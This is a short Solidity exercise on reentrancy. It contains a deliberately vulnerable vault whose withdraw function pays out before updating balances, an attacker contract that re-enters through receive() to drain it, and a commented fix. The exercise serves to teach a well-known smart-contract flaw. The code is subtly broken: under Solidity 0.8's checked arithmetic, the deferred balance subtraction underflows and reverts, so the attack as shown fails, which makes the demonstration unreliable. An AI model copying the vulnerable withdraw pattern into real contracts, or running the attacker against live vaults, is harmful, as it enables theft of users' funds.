// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
/// Exercise 02: Reentrancy Attack — ⭐
/// Pattern #2: CEI Violation

contract VulnerableVault {
    mapping(address => uint256) public balances;
    
    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }
    
    // VULNERABLE: External call BEFORE state update
    function withdraw(uint256 amount) external {
        require(balances[msg.sender] >= amount, "insufficient");
        (bool success,) = msg.sender.call{value: amount}(""); // ⚠️ before delete
        require(success, "transfer failed");
        balances[msg.sender] -= amount; // ⚠️ AFTER external call!
    }
}

// EXPLOIT
contract ReentrancyAttacker {
    VulnerableVault public vault;
    constructor(address _vault) { vault = VulnerableVault(_vault); }
    function attack() external payable {
        vault.deposit{value: msg.value}();
        vault.withdraw(msg.value); // Triggers receive() → reenters
    }
    receive() external payable {
        if (address(vault).balance >= msg.value) {
            vault.withdraw(msg.value); // Re-enter before balance updated!
        }
    }
}

// FIX: Update state first, then transfer
// balances[msg.sender] -= amount;
// (bool success,) = msg.sender.call{value: amount}("");
